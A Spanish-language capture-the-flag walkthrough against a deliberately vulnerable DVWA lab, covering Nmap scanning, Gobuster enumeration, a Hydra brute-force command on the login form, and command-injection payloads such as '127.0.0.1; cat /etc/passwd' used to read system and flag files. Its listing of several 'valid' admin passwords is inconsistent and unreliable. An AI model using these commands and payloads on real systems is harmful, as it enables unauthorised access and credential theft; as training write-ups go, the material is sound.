# 🛡️ Manual de Pentesting: Captura de Flag en DVWA - Escaneo, Enumeración y Command Injection

## 1. Escaneo de Puertos y Servicios

Comenzamos identificando los puertos abiertos del objetivo (`10.10.120.231`) usando **Nmap**:

```bash
sudo nmap 10.10.120.231 -n -Pn -sC -sV -sS --min-rate 5000 -oN scan1.txt
```

✅ Resultado:

- **Puerto 80/tcp abierto** (Servidor Apache 2.4.59 Debian)
- Página por defecto de Apache.

---

## 2. Enumeración de Directorios

Utilizamos **Gobuster** para encontrar rutas y archivos ocultos:

```bash
gobuster dir -u http://10.10.120.231 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```

✅ Descubrimiento:

- `/index.html`
- `/server-status` (403 Forbidden)
- No descubrimos `/dvwa/` inicialmente.

---

## 3. Fuerza Bruta de Acceso

Usamos **Hydra** para atacar el formulario de login de DVWA:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.120.231 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login failed"
```

✅ Usuarios y contraseñas válidas encontrados, por ejemplo:

- `admin:password`
- `admin:123456`
- `admin:iloveyou`
- (entre otros...)

---

## 4. Vulnerabilidad de Command Injection

Dentro de DVWA, en el módulo **Command Injection**, enviamos payloads maliciosos:

```bash
127.0.0.1; cat /etc/passwd
```

✅ Confirmamos ejecución de comandos en el sistema bajo el usuario `www-data`.

---

## 5. Búsqueda de Flags

Desde la web vulnerable, buscamos archivos relacionados a **flags**:

```bash
find / -name "*flag*" 2>/dev/null
```

✅ Hallazgo:

```
/var/www/html/DVWA/hackable/flags/fi.php
```

---

## 6. Captura del Flag

Leímos el contenido de `fi.php`:

```bash
127.0.0.1; cat /var/www/html/DVWA/hackable/flags/fi.php
```

Encontramos un texto codificado en **Base64**.

Contenido concatenado del código PHP:

```
NC4pIFRoZSBwb29sIG9uIFRoZSByb29mIG11c3QgaGF2ZSBhIGxlYWs=
```

Decodificando:

```bash
echo "NC4pIFRoZSBwb29sIG9uIFRoZSByb29mIG11c3QgaGF2ZSBhIGxlYWs=" | base64 -d
```

✅ Resultado del Flag:

```
4.) The pool on The roof must have a leak.
```

---

# 🌟 Conclusión

- **Explotación lograda**: Command Injection.
- **Flag capturada**: "The pool on The roof must have a leak."
- **Acceso obtenido**: ejecución remota de comandos como `www-data`.
- **Relevancia**: demuestra acceso a información sensible a través de explotación web.

---

# 📆 Anotaciones finales

| Concepto | Herramienta usada |
|:---------|:------------------|
| Escaneo de puertos | Nmap |
| Enumeración de rutas | Gobuster |
| Fuerza bruta de login | Hydra |
| Explotación de comandos | Payload manual en DVWA |
| Búsqueda de archivos sensibles | find, cat |
| Decodificación de Base64 | echo + base64 -d |

---

# 📦 Flag Capturada

> **4.) The pool on The roof must have a leak.**

🚩 **¡Éxito en la captura de la primera bandera!**

